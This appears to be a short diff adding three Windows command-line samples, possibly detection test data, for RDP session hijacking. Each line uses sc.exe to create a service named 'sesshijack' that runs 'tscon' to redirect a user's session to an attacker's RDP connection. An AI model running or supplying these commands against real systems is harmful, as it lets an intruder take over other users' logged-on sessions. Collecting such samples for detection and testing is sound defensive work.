@@ -1,0 +1,3 @@
+"cmd.exe" /c query user & sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55" & net start sesshijack
+cmd.exe /k tscon 1337 /dest:rdp-tcp#55
+sc.exe  create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
